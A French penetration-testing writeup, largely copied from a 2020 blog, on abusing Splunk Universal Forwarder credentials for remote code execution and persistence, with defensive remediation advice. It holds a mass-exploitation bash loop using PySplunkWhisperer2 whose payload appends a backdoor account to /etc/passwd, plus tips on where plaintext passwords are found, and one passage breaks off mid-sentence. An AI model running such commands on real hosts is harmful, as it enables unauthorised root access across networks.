Si vous effectuez une énumération interne ou externe d'une machine et que vous trouvez que Splunk est en cours d'exécution (port 8090), si vous connaissez par chance des identifiants valides, vous pouvez abuser du service Splunk pour exécuter un shell en tant qu'utilisateur exécutant Splunk. Si root l'exécute, vous pouvez escalader les privilèges à root.

De plus, si vous êtes déjà root et que le service Splunk n'écoute pas uniquement sur localhost, vous pouvez voler le fichier de mot de passe du service Splunk et casser les mots de passe, ou ajouter de nouvelles informations d'identification. Et maintenir la persistance sur l'hôte.

Dans la première image ci-dessous, vous pouvez voir à quoi ressemble une page Web Splunkd.

Les informations suivantes ont été copiées depuis https://eapolsniper.github.io/2020/08/14/Abusing-Splunk-Forwarders-For-RCE-And-Persistence/

# Abus de Splunk Forwarders pour les coquilles et la persistance

14 août 2020

## Description: <a href="#description" id="description"></a>

L'agent Splunk Universal Forwarder (UF) permet aux utilisateurs distants authentifiés d'envoyer des commandes ou des scripts uniques aux agents via l'API Splunk. L'agent UF ne valide pas les connexions provenant d'un serveur Splunk Enterprise valide, ni ne valide le code signé ou autrement prouvé provenant du serveur Splunk Enterprise. Cela permet à un attaquant qui obtient l'accès au mot de passe de l'agent UF d'exécuter du code arbitraire sur le serveur en tant que SYSTEM ou root, selon le système d'exploitation.

Cette attaque est utilisée par les testeurs de pénétration et est probablement exploitée activement dans la nature par des attaquants malveillants. L'obtention du mot de passe pourrait conduire à la compromission de centaines de systèmes dans un environnement client.

Les mots de passe Splunk UF sont relativement faciles à acquérir, voir la section Emplacements de mot de passe courants pour plus de détails.

## Contexte: <a href="#context" id="context"></a>

Splunk est un outil d'agrégation et de recherche de données souvent utilisé comme système de surveillance des informations de sécurité et des événements (SIEM). Splunk Enterprise Server est une application Web qui s'exécute sur un serveur, avec des agents, appelés Universal Forwarders, qui sont installés sur chaque système du réseau. Splunk fournit des binaires d'agent pour Windows, Linux, Mac et Unix. De nombreuses organisations utilisent Syslog pour envoyer des données à Splunk au lieu d'installer un agent sur les hôtes Linux/Unix, mais l'installation de l'agent devient de plus en plus populaire.

Universal Forwarder est accessible sur chaque hôte à https://host:8089. L'accès à l'un des appels d'API protégés, tels que /service/, fait apparaître une boîte d'authentification de base. Le nom d'utilisateur est toujours admin, et le mot de passe par défaut était changeme jusqu'en 2016, date à laquelle Splunk a exigé que toutes les nouvelles installations définissent un mot de passe de 8 caractères ou plus. Comme vous le remarquerez dans ma démonstration, la complexité n'est pas une exigence car le mot de passe de mon agent est 12345678. Un attaquant distant peut forcer le mot de passe sans verrouillage, ce qui est une nécessité pour un hôte de journal, car si le compte est verrouillé, les journaux ne seraient plus envoyés au serveur Splunk et un attaquant pourrait l'utiliser pour masquer ses attaques. La capture d'écran suivante montre l'agent Universal Forwarder, cette page initiale est accessible sans authentification et peut être utilisée pour énumérer les hôtes exécutant Splunk Universal Forwarder.

![0](https://eapolsniper.github.io/assets/2020AUG14/11\_SplunkAgent.png)

La documentation Splunk montre l'utilisation du même mot de passe de transfert universel pour tous les agents, je ne me souviens pas avec certitude si c'est une exigence ou si des mots de passe individuels peuvent être définis pour chaque agent, mais sur la base de la documentation et de la mémoire de quand j'étais un administrateur Splunk, je crois que tous les agents doivent utiliser le même mot de passe. Cela signifie que si le mot de passe est trouvé ou craqué sur un système, il est susceptible de fonctionner sur tous les hôtes Splunk UF. Cela a été mon expérience personnelle, permettant la compromission de centaines d'hôtes rapidement.

## Emplacements de mot de passe courants <a href="#common-password-locations" id="common-password-locations"></a>

Je trouve souvent le mot de passe en texte clair de l'agent de transfert universel Splunk aux emplacements suivants sur les réseaux :

1. Répertoire Active Directory Sysvol/domain.com/Scripts. Les administrateurs stockent l'exécutable et le mot de passe ensemble pour une installation efficace de l'agent.
2. Partages de fichiers réseau hébergeant des fichiers d'installation IT
3. Wiki ou autres référentiels de notes de construction sur le réseau interne

Le mot de passe peut également être accédé sous forme de hachage dans Program Files\Splunk\etc\passwd sur les hôtes Windows, et dans /opt/Splunk/etc/passwd sur les hôtes Linux et Unix. Un attaquant peut tenter de craquer le mot de passe en utilisant Hashcat, ou louer un environnement de craquage en nuage pour augmenter la probabilité de craquer le hachage. Le mot de passe est un hachage SHA-256 fort et, en tant que tel, un mot de passe fort et aléatoire est peu susceptible d'être craqué.

## Impact: <a href="#impact" id="impact"></a>

Un attaquant avec un mot de passe d'agent de transfert universel Splunk peut compromettre complètement tous les hôtes Splunk du réseau et obtenir des autorisations de niveau SYSTEM ou root sur chaque hôte. J'ai utilisé avec succès l'agent Splunk sur des hôtes Windows, Linux et Solaris Unix. Cette vulnérabilité pourrait permettre de récupérer les informations d'identification du système, d'exfiltrer des données sensibles ou d'installer des rançongiciels. Cette vulnérabilité est rapide, facile à utiliser et
```bash
for i in `cat ip.txt`; do python PySplunkWhisperer2_remote.py --host $i --port 8089 --username admin --password "12345678" --payload "echo 'attacker007:x:1003:1003::/home/:/bin/bash' >> /etc/passwd" --lhost 192.168.42.51;done
```
Informations sur l'hôte :

Serveur Splunk Enterprise : 192.168.42.114\
Victime de l'agent Splunk Forwarder : 192.168.42.98\
Attaquant : 192.168.42.51

Version de Splunk Enterprise : 8.0.5 (la plus récente au 12 août 2020 - jour de la configuration du laboratoire)\
Version de l'Universal Forwarder : 8.0.5 (la plus récente au 12 août 2020 - jour de la configuration du laboratoire)

### Recommandations de remédiation pour Splunk, Inc : <a href="#remediation-recommendations-for-splunk-inc" id="remediation-recommendations-for-splunk-inc"></a>

Je recommande de mettre en œuvre toutes les solutions suivantes pour fournir une défense en profondeur :

1. Idéalement, l'agent Universal Forwarder ne devrait pas avoir de port ouvert du tout, mais plutôt interroger le serveur Splunk à intervalles réguliers pour obtenir des instructions.
2. Activer l'authentification mutuelle TLS entre les clients et le serveur, en utilisant des clés individuelles pour chaque client. Cela fournirait une sécurité bidirectionnelle très élevée entre tous les services Splunk. L'authentification mutuelle TLS est largement mise en œuvre dans les agents et les appareils IoT, c'est l'avenir de la communication client-serveur de périphériques de confiance.
3. Envoyer tous les fichiers de code, de ligne unique ou de script, dans un fichier compressé qui est chiffré et signé par le serveur Splunk. Cela ne protège pas les données de l'agent envoyées via l'API, mais protège contre l'exécution de code à distance malveillant d'un tiers.

### Recommandations de remédiation pour les clients Splunk : <a href="#remediation-recommendations-for-splunk-customers" id="remediation-recommendations-for-splunk-customers"></a>

1. Assurez-vous qu'un mot de passe très fort est défini pour les agents Splunk. Je recommande au moins un mot de passe aléatoire de 15 caractères, mais comme ces mots de passe ne sont jamais saisis, cela pourrait être défini sur un mot de passe très long, tel que 50 caractères.
2. Configurez des pare-feux basés sur l'hôte pour n'autoriser les connexions au port 8089/TCP (port de l'agent Universal Forwarder) que depuis le serveur Splunk.

## Recommandations pour l'équipe Red : <a href="#recommendations-for-red-team" id="recommendations-for-red-team"></a>

1. Téléchargez une copie de l'Universal Forwarder Splunk pour chaque système d'exploitation, car c'est un excellent implant léger signé. Bon à garder une copie au cas où Splunk corrigerait réellement cela.

## Exploits/Blogs d'autres chercheurs <a href="#exploitsblogs-from-other-researchers" id="exploitsblogs-from-other-researchers"></a>

Exploits publics utilisables :

* https://github.com/cnotin/SplunkWhisperer2/tree/master/PySplunkWhisperer2
* https://www.exploit-db.com/exploits/46238
* https://www.exploit-db.com/exploits/46487

Articles de blog connexes :

* https://clement.notin.org/blog/2019/02/25/Splunk-Universal-Forwarder-Hijacking-2-SplunkWhisperer2/
* https://medium.com/@airman604/splunk-universal-forwarder-hijacking-5899c3e0e6b2
* https://www.hurricanelabs.com/splunk-tutorials/using-splunk-as-an-offensive-security-tool

_** Note : **_ Ce problème est un problème grave avec les systèmes Splunk et il a été exploité par d'autres testeurs depuis des années. Bien que l'exécution de code à distance soit une fonctionnalité prévue de l'Universal Forwarder Splunk, la mise en œuvre de celle-ci est dangereuse. J'ai tenté de soumettre ce bogue via le programme de primes de bogues de Splunk dans la très improbable chance qu'ils ne soient pas conscients des implications de conception, mais j'ai été informé que toutes les soumissions de bogues mettent en œuvre la politique de divulgation Bug Crowd/Splunk qui stipule que aucun détail de la vulnérabilité ne peut être discuté publiquement _jamais_ sans la permission de Splunk. J'ai demandé un délai de divulgation de 90 jours et j'ai été refusé. En tant que tel, je n'ai pas divulgué cela de manière responsable car je suis raisonnablement sûr que Splunk est conscient du problème et a choisi de l'ignorer, je pense que cela pourrait avoir un impact grave sur les entreprises et il est de la responsabilité de la communauté de l'infosec d'éduquer les entreprises.
